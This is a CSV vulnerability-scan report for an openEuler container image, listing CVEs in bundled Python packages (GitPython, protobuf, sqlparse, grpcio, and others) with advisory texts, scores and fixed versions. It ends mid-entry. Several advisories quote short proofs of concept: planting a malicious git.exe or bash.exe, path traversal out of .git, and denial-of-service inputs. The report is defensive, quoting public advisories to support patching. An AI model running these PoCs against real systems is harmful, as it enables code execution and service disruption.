https://harbor.archeros.cn/dev/arstack/openstack-3.0/openeuler-binary-araccel-agent:aarch64_3.0.0.65 | Image Id: eff0bfe5cccb759da7a35733edb72dbe7118412e43abd6bf1c03c9f6cfd051b1 | CVE数据库版本: 3.582 | DB创建时间: Oct 11  2024 09:24:36 | OS: openeuler:22.03
cves,description,feed_rating,fixed_version,in_base_image,last_modified_timestamp,link,name,package_name,package_version,published_timestamp,score,score_v3,severity,vectors,vectors_v3,tags
"CVE-2024-22190","Untrusted search path under some conditions on Windows allows arbitrary code execution
### Summary

This issue exists because of an incomplete fix for CVE-2023-40590. On Windows, GitPython uses an untrusted search path if it uses a shell to run `git`, as well as when it runs `bash.exe` to interpret hooks. If either of those features are used on Windows, a malicious `git.exe` or `bash.exe` may be run from an untrusted repository.

### Details

Although GitPython often avoids executing programs found in an untrusted search path since 3.1.33, two situations remain where this still occurs. Either can allow arbitrary code execution under some circumstances.

#### When a shell is used

GitPython can be told to run `git` commands through a shell rather than as direct subprocesses, by passing `shell=True` to any method that accepts it, or by both setting `Git.USE_SHELL = True` and not passing `shell=False`. Then the Windows `cmd.exe` shell process performs the path search, and GitPython does not prevent that shell from finding and running `git` in the current directory.

When GitPython runs `git` directly rather than through a shell, the GitPython process performs the path search, and currently omits the current directory by setting `NoDefaultCurrentDirectoryInExePath` in its own environment during the `Popen` call. Although the `cmd.exe` shell will honor this environment variable when present, GitPython does not currently pass it into the shell subprocess's environment.

Furthermore, because GitPython sets the subprocess CWD to the root of a repository's working tree, using a shell will run a malicious `git.exe` in an untrusted repository even if GitPython itself is run from a trusted location.

This also applies if `Git.execute` is called directly with `shell=True` (or after `Git.USE_SHELL = True`) to run any command.

#### When hook scripts are run

On Windows, GitPython uses `bash.exe` to run hooks that appear to be scripts. However, unlike when running `git`, no steps are taken to avoid finding and running `bash.exe` in the current directory.

This allows the author of an untrusted fork or branch to cause a malicious `bash.exe` to be run in some otherwise safe workflows. An example of such a scenario is if the user installs a trusted hook while on a trusted branch, then switches to an untrusted feature branch (possibly from a fork) to review proposed changes. If the untrusted feature branch contains a malicious `bash.exe` and the user's current working directory is the working tree, and the user performs an action that runs the hook, then although the hook itself is uncorrupted, it runs with the malicious `bash.exe`.

Note that, while `bash.exe` is a shell, this is a separate scenario from when `git` is run using the unrelated Windows `cmd.exe` shell.

### PoC

On Windows, create a `git.exe` file in a repository. Then create a `Repo` object, and call any method through it (directly or indirectly) that supports the `shell` keyword argument with `shell=True`:

```powershell
mkdir testrepo
git init testrepo
cp ... testrepo git.exe # Replace '...' with any executable of choice.
python -c 'import git; print(git.Repo('testrepo').git.version(shell=True))'
```

The `git.exe` executable in the repository directory will be run.

Or use no `Repo` object, but do it from the location with the `git.exe`:

```powershell
cd testrepo
python -c 'import git; print(git.Git().version(shell=True))'
```

The `git.exe` executable in the current directory will be run.

For the scenario with hooks, install a hook in a repository, create a `bash.exe` file in the current directory, and perform an operation that causes GitPython to attempt to run the hook:

```powershell
mkdir testrepo
cd testrepo
git init
mv .git/hooks/pre-commit.sample .git/hooks/pre-commit
cp ... bash.exe # Replace '...' with any executable of choice.
echo 'Some text' >file.txt
git add file.txt
python -c 'import git; git.Repo().index.commit('Some message')'
```

The `bash.exe` executable in the current directory will be run.

### Impact

The greatest impact is probably in applications that set `Git.USE_SHELL = True` for historical reasons. (Undesired console windows had, in the past, been created in some kinds of applications, when it was not used.) Such an application may be vulnerable to arbitrary code execution from a malicious repository, even with no other exacerbating conditions. This is to say that, if a shell is used to run `git`, the full effect of CVE-2023-40590 is still present. Furthermore, as noted above, running the application itself from a trusted directory is not a sufficient mitigation.

An application that does not direct GitPython to use a shell to run `git` subprocesses thus avoids most of the risk. However, there is no such straightforward way to prevent GitPython from running `bash.exe` to interpret hooks. So while the conditions needed for that to be exploited are more involved, it may be harder to mitigate decisively prior to patching.

### Possible solutions

A straightforward approach would be to address each bug directly:

- When a shell is used, pass `NoDefaultCurrentDirectoryInExePath` into the subprocess environment, because in that scenario the subprocess is the `cmd.exe` shell that itself performs the path search.
- Set `NoDefaultCurrentDirectoryInExePath` in the GitPython process environment during the `Popen` call made to run hooks with a `bash.exe` subprocess.

These need only be done on Windows.
","High","3.1.41","false","Sat Sep 21 2024 05:04:20 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-2mqj-m65w-jghx","CVE-2024-22190","usr/lib/python3.9/site-packages/GitPython-3.1.32-py3.9","3.1.32","Wed Jan 10 2024 23:46:00 GMT+0800 (中国标准时间)","7","7.8","High","","CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",""
"CVE-2024-39689","Certifi removes GLOBALTRUST root certificate
Certifi 2024.07.04 removes root certificates from 'GLOBALTRUST' from the root store. These are in the process of being removed from Mozilla's trust store.

GLOBALTRUST's root certificates are being removed pursuant to an investigation which identified 'long-running and unresolved compliance issues'. Conclusions of Mozilla's investigation can be found [here]( https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI).
","High","2024.07.04","false","Mon Jul 08 2024 23:38:32 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-248v-346w-9cwc","CVE-2024-39689","usr/lib/python3.9/site-packages/certifi-2023.7.22-py3.9","2023.7.22","Sat Jul 06 2024 04:06:40 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",""
"CVE-2022-40899","Python Charmers Future denial of service vulnerability
An issue discovered in Python Charmers Future 0.18.2 and earlier allows remote attackers to cause a denial of service via crafted Set-Cookie header from malicious web server. This issue has been patched in version 0.18.3.
","High","0.18.3","false","Sat Sep 21 2024 04:10:18 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-v3c5-jqr6-7qm8","CVE-2022-40899","usr/lib/python3.9/site-packages/future-0.18.2-py3.9","0.18.2","Fri Dec 23 2022 08:30:23 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2021-22570","NULL Pointer Dereference in Protocol Buffers
Nullptr dereference when a null char is present in a proto symbol. The symbol is parsed incorrectly, leading to an unchecked call into the proto file's name during generation of the resulting error message. Since the symbol is incorrectly parsed, the file is nullptr. We recommend upgrading to version 3.15.0 or greater.
","High","3.15.0","false","Wed Aug 16 2023 13:02:15 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-77rm-9x9h-xj3g","CVE-2021-22570","usr/lib/python3.9/site-packages/protobuf-3.14.0-py3.9","3.14.0","Thu Jan 27 2022 08:01:15 GMT+0800 (中国标准时间)","2.1","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2022-1941","protobuf-cpp and protobuf-python have potential Denial of Service issue
### Summary

A message parsing and memory management vulnerability in ProtocolBuffer’s C++ and Python implementations can trigger an out of memory (OOM) failure when processing a specially crafted message, which could lead to a denial of service (DoS) on services using the libraries.

Reporter: [ClusterFuzz](https://google.github.io/clusterfuzz/)

Affected versions: All versions of C++ Protobufs (including Python) prior to the versions listed below.

### Severity & Impact
As scored by google  
**Medium 5.7** - [CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H)  
Asscored byt NIST  
**High 7.5** - [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

A small (~500 KB) malicious payload can be constructed which causes the running service to allocate more than 3GB of RAM.

### Proof of Concept

For reproduction details, please refer to the unit test that identifies the specific inputs that exercise this parsing weakness.

### Mitigation / Patching

Please update to the latest available versions of the following packages:
- protobuf-cpp (3.18.3, 3.19.5, 3.20.2, 3.21.6)
- protobuf-python (3.18.3, 3.19.5, 3.20.2, 4.21.6)
","High","3.18.3;3.19.5;3.20.2;4.21.6","false","Sat Jul 06 2024 05:23:58 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-8gq9-2x98-w8hf","CVE-2022-1941","usr/lib/python3.9/site-packages/protobuf-3.14.0-py3.9","3.14.0","Sat Sep 24 2022 04:31:15 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2022-42969","ReDoS in py library when used with subversion 
The py library through 1.11.0 for Python allows remote attackers to conduct a ReDoS (Regular expression Denial of Service) attack via a Subversion repository with crafted info data, because the InfoSvnCommand argument is mishandled.

The particular codepath in question is the regular expression at `py._path.svnurl.InfoSvnCommand.lspattern` and is only relevant when dealing with subversion (svn) projects. Notably the codepath is not used in the popular pytest project. The developers of the pytest package have released version `7.2.0` which removes their dependency on `py`. Users of `pytest` seeing alerts relating to this advisory may update to version `7.2.0` of `pytest` to resolve this issue. See https://github.com/pytest-dev/py/issues/287#issuecomment-1290407715 for additional context.
","High",">1.11.0","false","Thu Aug 17 2023 13:01:50 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-w596-4wvx-j9j6","CVE-2022-42969","usr/lib/python3.9/site-packages/py-1.11.0-py3.9","1.11.0","Sun Oct 16 2022 20:00:23 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2024-6345","setuptools vulnerable to Command Injection via package URL
A vulnerability in the `package_index` module of pypa/setuptools versions up to 69.1.1 allows for remote code execution via its download functions. These functions, which are used to download packages from URLs provided by users or retrieved from package index servers, are susceptible to code injection. If these functions are exposed to user-controlled inputs, such as package URLs, they can execute arbitrary commands on the system. The issue is fixed in version 70.0.
","High","70.0.0","false","Sun Aug 04 2024 13:03:40 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-cx63-2mw6-8hw5","CVE-2024-6345","usr/lib/python3.9/site-packages/setuptools-59.4.0","59.4.0","Mon Jul 15 2024 11:30:57 GMT+0800 (中国标准时间)","7","8.8","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",""
"CVE-2022-40897","pypa/setuptools vulnerable to Regular Expression Denial of Service (ReDoS)
Python Packaging Authority (PyPA)'s setuptools is a library designed to facilitate packaging Python projects. Setuptools version 65.5.0 and earlier could allow remote attackers to cause a denial of service by fetching malicious HTML from a PyPI package or custom PackageIndex page due to a vulnerable Regular Expression in `package_index`. This has been patched in version 65.5.1.
","High","65.5.1","false","Tue Jun 25 2024 05:24:10 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-r9hx-vwmv-q579","CVE-2022-40897","usr/lib/python3.9/site-packages/setuptools-59.4.0","59.4.0","Fri Dec 23 2022 08:30:23 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"","Duplicate Advisory: sqlparse parsing heavily nested list leads to Denial of Service
## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-2m57-hf25-phgg. This link is maintained to preserve external references.

## Original Description
Passing a heavily nested list to sqlparse.parse() leads to a Denial of Service due to RecursionError.
","High","0.5.0","false","Wed May 01 2024 19:08:48 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-62qf-jcq8-8gxw","GHSA-62qf-jcq8-8gxw","usr/lib/python3.9/site-packages/sqlparse-0.4.2-py3.9","0.4.2","Tue Apr 30 2024 23:30:38 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2024-4340","sqlparse parsing heavily nested list leads to Denial of Service
### Summary
Passing a heavily nested list to sqlparse.parse() leads to a Denial of Service due to RecursionError.

### Details + PoC
Running the following code will raise Maximum recursion limit exceeded exception:
```py
import sqlparse
sqlparse.parse('[' * 10000 + ']' * 10000)
```
We expect a traceback of RecursionError:
```py
Traceback (most recent call last):
  File 'trigger_sqlparse_nested_list.py', line 3, in <module>
    sqlparse.parse('[' * 10000 + ']' * 10000)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/__init__.py', line 30, in parse
    return tuple(parsestream(sql, encoding))
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/filter_stack.py', line 36, in run
    stmt = grouping.group(stmt)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py', line 428, in group
    func(stmt)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py', line 53, in group_brackets
    _group_matching(tlist, sql.SquareBrackets)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/engine/grouping.py', line 48, in _group_matching
    tlist.group_tokens(cls, open_idx, close_idx)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 328, in group_tokens
    grp = grp_cls(subtokens)
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 161, in __init__
    super().__init__(None, str(self))
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 165, in __str__
    return ''.join(token.value for token in self.flatten())
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 165, in <genexpr>
    return ''.join(token.value for token in self.flatten())
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 214, in flatten
    yield from token.flatten()
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 214, in flatten
    yield from token.flatten()
  File '/home/uriya/.local/lib/python3.10/site-packages/sqlparse/sql.py', line 214, in flatten
    yield from token.flatten()
  [Previous line repeated 983 more times]
RecursionError: maximum recursion depth exceeded
```

### Fix suggestion
The [flatten()](https://github.com/andialbrecht/sqlparse/blob/master/sqlparse/sql.py#L207) function of TokenList class should limit the recursion to a maximal depth:
```py
from sqlparse.exceptions import SQLParseError

MAX_DEPTH = 100

    def flatten(self, depth=1):
        '''Generator yielding ungrouped tokens.

        This method is recursively called for all child tokens.
        '''
    if depth >= MAX_DEPTH:
        raise SQLParseError('Maximal depth reached')
        for token in self.tokens:
            if token.is_group:
                yield from token.flatten(depth + 1)
            else:
                yield token
```

### Impact
Denial of Service (the impact depends on the use).
Anyone parsing a user input with sqlparse.parse() is affected.

","High","0.5.0","false","Wed May 01 2024 19:09:13 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-2m57-hf25-phgg","CVE-2024-4340","usr/lib/python3.9/site-packages/sqlparse-0.4.2-py3.9","0.4.2","Tue Apr 16 2024 04:21:25 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2022-24761","HTTP Request Smuggling in waitress
### Impact

When using Waitress behind a proxy that does not properly validate the incoming HTTP request matches the RFC7230 standard, Waitress and the frontend proxy may disagree on where one request starts and where it ends.

This would allow requests to be smuggled via the front-end proxy to waitress and later behavior.

There are two classes of vulnerability that may lead to request smuggling that are addressed by this advisory:

- The use of Python's `int()` to parse strings into integers, leading to `+10` to be parsed as `10`, or `0x01` to be parsed as `1`, where as the standard specifies that the string should contain only digits or hex digits.
- Waitress does not support chunk extensions, however it was discarding them without validating that they did not contain illegal characters

### Patches

This has been fixed in Waitress 2.1.1

### Workarounds

When deploying a proxy in front of waitress, turning on any and all functionality to make sure that the request matches the RFC7230 standard. Certain proxy servers may not have this functionality though and users are encouraged to upgrade to the latest version of waitress instead.

### References

- https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

### For more information

If you have any questions or comments about this advisory:
* Open an issue in [the Github issue tracker](https://github.com/Pylons/waitress/issues) (if not security related/sensitive)
* Email us at [pylons-project-security@googlegroups.com](mailto:pylons-project-security@googlegroups.com) (If security related or sensitive)

","High","2.1.1","false","Fri Jan 27 2023 13:00:58 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-4f7p-27jc-3c36","CVE-2022-24761","usr/lib/python3.9/site-packages/waitress-2.0.0-py3.9","2.0.0","Sat Mar 19 2022 03:00:59 GMT+0800 (中国标准时间)","5","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",""
"CVE-2023-0286","Vulnerable OpenSSL included in cryptography wheels
pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8.1-39.0.0  are vulnerable to a security issue. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20221213.txt and https://www.openssl.org/news/secadv/20230207.txt.

If you are building cryptography source ('sdist') then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.


","High","39.0.1","false","Tue Feb 06 2024 04:44:21 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-x4qr-2fvf-3mr5","CVE-2023-0286","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Thu Feb 09 2023 06:17:06 GMT+0800 (中国标准时间)","7","7.4","High","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H",""
"CVE-2023-50782","Python Cryptography package vulnerable to Bleichenbacher timing oracle attack
A flaw was found in the python-cryptography package. This issue may allow a remote attacker to decrypt captured messages in TLS servers that use RSA key exchanges, which may lead to exposure of confidential or sensitive data.
","High","42.0.0","false","Thu Aug 08 2024 13:10:55 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-3ww4-gg4f-jr7f","CVE-2023-50782","usr/lib64/python3.9/site-packages/cryptography-36.0.1-py3.9","36.0.1","Tue Feb 06 2024 05:30:31 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",""
"CVE-2023-1428","gRPC Reachable Assertion issue
There exists an vulnerability causing an abort() to be called in gRPC. 
The following headers cause gRPC's C++ implementation to abort() when called via http2:

te: x (x != trailers)

:scheme: x (x != http, https)

grpclb_client_stats: x (x == anything)

On top of sending one of those headers, a later header must be sent that gets the total header size past 8KB. We recommend upgrading past git commit 2485fa94bd8a723e5c977d55a3ce10b301b437f8 or v1.53 and above.
","High","1.53.0","false","Fri Nov 10 2023 13:00:50 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-6628-q6j9-w8vg","CVE-2023-1428","usr/lib64/python3.9/site-packages/grpcio-1.41.1-py3.9","1.41.1","Fri Jul 07 2023 05:15:08 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2023-33953","Excessive Iteration in gRPC
gRPC contains a vulnerability that allows hpack table accounting errors could lead to unwanted disconnects between clients and servers in exceptional cases/ Three vectors were found that allow the following DOS attacks:

- Unbounded memory buffering in the HPACK parser
- Unbounded CPU consumption in the HPACK parser

The unbounded CPU consumption is down to a copy that occurred per-input-block in the parser, and because that could be unbounded due to the memory copy bug we end up with an O(n^2) parsing loop, with n selected by the client.

The unbounded memory buffering bugs:

- The header size limit check was behind the string reading code, so we needed to first buffer up to a 4 gigabyte string before rejecting it as longer than 8 or 16kb.
- HPACK varints have an encoding quirk whereby an infinite number of 0’s can be added at the start of an integer. gRPC’s hpack parser needed to read all of them before concluding a parse.
- gRPC’s metadata overflow check was performed per frame, so that the following sequence of frames could cause infinite buffering: HEADERS: containing a: 1 CONTINUATION: containing a: 2 CONTINUATION: containing a: 3 etc…
","High","1.53.2;1.54.3;1.55.2;1.56.2","false","Wed Jul 31 2024 05:37:54 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-496j-2rq6-j6cc","CVE-2023-33953","usr/lib64/python3.9/site-packages/grpcio-1.41.1-py3.9","1.41.1","Wed Aug 09 2023 23:30:15 GMT+0800 (中国标准时间)","7","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2023-32731","Connection confusion in gRPC
When gRPC HTTP2 stack raised a header size exceeded error, it skipped parsing the rest of the HPACK frame. This caused any HPACK table mutations to also be skipped, resulting in a desynchronization of HPACK tables between sender and receiver. If leveraged, say, between a proxy and a backend, this could lead to requests from the proxy being interpreted as containing headers from different proxy clients - leading to an information leak that can be used for privilege escalation or data exfiltration. We recommend upgrading beyond the commit contained in  https://github.com/grpc/grpc/pull/32309
","High","1.53.0","false","Fri Nov 10 2023 13:00:35 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-cfgp-2977-2fmm","CVE-2023-32731","usr/lib64/python3.9/site-packages/grpcio-1.41.1-py3.9","1.41.1","Thu Jul 06 2023 03:12:51 GMT+0800 (中国标准时间)","7","7.4","High","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H",""
"CVE-2022-31116","Incorrect handling of invalid surrogate pair characters
### Impact
_What kind of vulnerability is it? Who is impacted?_

Anyone parsing JSON from an untrusted source is vulnerable.

JSON strings that contain escaped surrogate characters not part of a proper surrogate pair were decoded incorrectly. Besides corrupting strings, this allowed for potential key confusion and value overwriting in dictionaries.

Examples:

```python
# An unpaired high surrogate character is ignored.
>>> ujson.loads(r''\uD800'')
''
>>> ujson.loads(r''\uD800hello'')
'hello'

# An unpaired low surrogate character is preserved.
>>> ujson.loads(r''\uDC00'')
'\udc00'

# A pair of surrogates with additional non surrogate characters pair up in spite of being invalid.
>>> ujson.loads(r''\uD800foo bar\uDC00'')
'foo bar𐀀'
```

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Users should upgrade to UltraJSON 5.4.0.

From version 5.4.0, UltraJSON decodes lone surrogates in the same way as the standard library's `json` module does, preserving them in the parsed output:

```python3
>>> ujson.loads(r''\uD800'')
'\ud800'
>>> ujson.loads(r''\uD800hello'')
'\ud800hello'
>>> ujson.loads(r''\uDC00'')
'\udc00'
>>> ujson.loads(r''\uD800foo bar\uDC00'')
'\ud800foo bar\udc00'
```

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

Short of switching to an entirely different JSON library, there are no safe alternatives to upgrading.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [UltraJSON](http://github.com/ultrajson/ultrajson/issues)

","High","5.4.0","false","Fri Jan 27 2023 13:05:12 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-wpqr-jcpx-745r","CVE-2022-31116","usr/lib64/python3.9/site-packages/ujson-4.0.2-py3.9","4.0.2","Wed Jul 06 2022 05:06:00 GMT+0800 (中国标准时间)","5","7.5","High","","CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2023-41040","GitPython blind local file inclusion
### Summary

In order to resolve some git references, GitPython reads files from the `.git` directory, in some places the name of the file being read is provided by the user, GitPython doesn't check if this file is located outside the `.git` directory. This allows an attacker to make GitPython read any file from the system.

### Details

This vulnerability is present in

https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/refs/symbolic.py#L174-L175

That code joins the base directory with a user given string without checking if the final path is located outside the base directory.

I was able to exploit it from three places, but there may be more code paths that lead to it:

https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/repo/base.py#L605

https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/repo/base.py#L620

https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/index/base.py#L1353

### PoC

Running GitPython within any repo should work, here is an example with the GitPython repo.

```python
import git

r = git.Repo('.')

# This will make GitPython read the README.md file from the root of the repo
r.commit('../README.md')
r.tree('../README.md')
r.index.diff('../README.md')

# Reading /etc/random
# WARNING: this will probably halt your system, run with caution
# r.commit('../../../../../../../../../dev/random')
```

### Impact

I wasn't able to show the contents of the files (that's why 'blind' local file inclusion), depending on how GitPython is being used, this can be used by an attacker for something _inoffensive_ as checking if a file exits, or cause a DoS by making GitPython read a big/infinite file (like `/dev/random` on Linux systems).

### Possible solutions

A solution would be to check that the final path isn't located outside the `repodir` path (maybe even after resolving symlinks). Maybe there could be other checks in place to make sure that the reference names are valid.

---

> [!NOTE]
> This vulnerability was reported via email, and it was decided to publish it here and make it public, so the community is aware of it, and a fix can be provided.
","Medium","3.1.37","false","Sat Sep 21 2024 04:05:12 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-cwvm-v4w8-q58c","CVE-2023-41040","usr/lib/python3.9/site-packages/GitPython-3.1.32-py3.9","3.1.32","Thu Aug 31 2023 04:09:36 GMT+0800 (中国标准时间)","4","4","Medium","","CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",""
"CVE-2024-34064","Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter
The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.

Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.
","Medium","3.1.4","false","Tue Jun 11 2024 02:30:58 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-h75v-3vvj-5mfj","CVE-2024-34064","usr/lib/python3.9/site-packages/Jinja2-3.0.3-py3.9","3.0.3","Mon May 06 2024 22:20:59 GMT+0800 (中国标准时间)","4","5.4","Medium","","CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",""
"CVE-2022-40896","Pygments vulnerable to ReDoS
A ReDoS issue was discovered in `pygments/lexers/smithy.py` in Pygments until 2.15.0 via SmithyLexer.
","Medium","2.15.0","false","Thu Mar 28 2024 21:28:18 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-mrwq-x4v8-fh7p","CVE-2022-40896","usr/lib/python3.9/site-packages/Pygments-2.10.0-py3.9","2.10.0","Wed Jul 19 2023 23:30:26 GMT+0800 (中国标准时间)","4","5.5","Medium","","CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",""
"CVE-2023-29483","Potential DoS via the Tudoor mechanism in eventlet and dnspython
eventlet before 0.35.2, as used in dnspython before 2.6.0, allows remote attackers to interfere with DNS name resolution by quickly sending an invalid packet from the expected IP address and source port, aka a 'TuDoor' attack. In other words, dnspython does not have the preferred behavior in which the DNS name resolution algorithm would proceed, within the full time window, in order to wait for a valid packet. NOTE: dnspython 2.6.0 is unusable for a different reason that was addressed in 2.6.1.
","Medium","2.6.1","false","Wed Jun 26 2024 11:31:49 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-3rq5-2g8h-59hc","CVE-2023-29483","usr/lib/python3.9/site-packages/dnspython-2.2.1-py3.9","2.2.1","Thu Apr 11 2024 23:30:48 GMT+0800 (中国标准时间)","4","5.9","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2023-29483","Potential DoS via the Tudoor mechanism in eventlet and dnspython
eventlet before 0.35.2, as used in dnspython before 2.6.0, allows remote attackers to interfere with DNS name resolution by quickly sending an invalid packet from the expected IP address and source port, aka a 'TuDoor' attack. In other words, dnspython does not have the preferred behavior in which the DNS name resolution algorithm would proceed, within the full time window, in order to wait for a valid packet. NOTE: dnspython 2.6.0 is unusable for a different reason that was addressed in 2.6.1.
","Medium","0.35.2","false","Wed Jun 26 2024 11:31:49 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-3rq5-2g8h-59hc","CVE-2023-29483","usr/lib/python3.9/site-packages/eventlet-0.33.0-py3.9","0.33.0","Thu Apr 11 2024 23:30:48 GMT+0800 (中国标准时间)","4","5.9","Medium","","CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2024-3651","Internationalized Domain Names in Applications (IDNA) vulnerable to denial of service from specially crafted inputs to idna.encode
### Impact
A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.

### Patches
The function has been refined to reject such strings without the associated resource consumption in version 3.7.

### Workarounds
Domain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.

### References
* https://huntr.com/bounties/93d78d07-d791-4b39-a845-cbfabc44aadb
","Medium","3.7","false","Wed Jul 31 2024 13:03:14 GMT+0800 (中国标准时间)","https://github.com/advisories/GHSA-jjg7-2v4v-x38h","CVE-2024-3651","usr/lib/python3.9/site-packages/idna-3.2-py3.9","3.2","Fri Apr 12 2024 05:32:40 GMT+0800 (中国标准时间)","4","6.2","Medium","","CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",""
"CVE-2022-36087","OAuthLib vulnerable to DoS when attacker provides malicious IPV6 URI
### Impact
- Attacker providing malicious redirect uri can cause DoS to oauthlib's web application.
- Attacker can also leverage usage of `uri_validate` functions depending where it is used.

_What kind of vulnerability is it? Who is impacted?_

Oauthlib applications using OAuth2.0 provider support or use directly `uri_validate` function.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

Issue fixed in 3.2.2 release.

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

